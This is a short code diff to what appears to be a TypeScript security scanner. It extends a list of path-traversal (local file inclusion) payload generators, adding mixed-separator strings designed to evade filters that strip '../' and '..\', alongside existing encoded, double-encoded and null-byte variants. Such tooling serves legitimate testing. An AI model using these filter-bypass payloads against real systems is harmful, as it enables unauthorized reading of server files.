@@ -219,8 +219,12 @@ const LFI_TECHNIQUES: { name: string; slash: "fwd" | "back"; make: (f: string) =
   { name: "..%5c", slash: "back", make: (f) => "..%5c".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") },
   { name: "%2e%2e%2f", slash: "fwd", make: (f) => "%2e%2e%2f".repeat(LFI_DEPTH) + f },
   { name: "..%252f", slash: "fwd", make: (f) => "..%252f".repeat(LFI_DEPTH) + f }, // double-encoded
-  { name: "....//", slash: "fwd", make: (f) => "....//".repeat(LFI_DEPTH) + f }, // single-strip bypass
-  { name: "....\\\\", slash: "back", make: (f) => "....\\\\".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") }, // single-strip win
+  { name: "....//", slash: "fwd", make: (f) => "....//".repeat(LFI_DEPTH) + f }, // single-strip `../` bypass
+  { name: "....\\\\", slash: "back", make: (f) => "....\\\\".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") }, // single-strip `..\` win
+  // mixed-separator self-reconstruct — beats a filter stripping BOTH `../` and `..\`: after `..\` is
+  // removed `....\/` collapses to `../`; `..../\` covers the reverse strip-order → `..\`.
+  { name: "....\\/", slash: "fwd", make: (f) => "....\\/".repeat(LFI_DEPTH) + f },
+  { name: "..../\\", slash: "back", make: (f) => "..../\\".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") },
   { name: "null-byte", slash: "fwd", make: (f) => "../".repeat(LFI_DEPTH) + f + "%00" }, // legacy PHP
 ]
 const LFI_ABSOLUTE: { name: string; make: (f: string) => string; os: "unix" | "windows" }[] = [
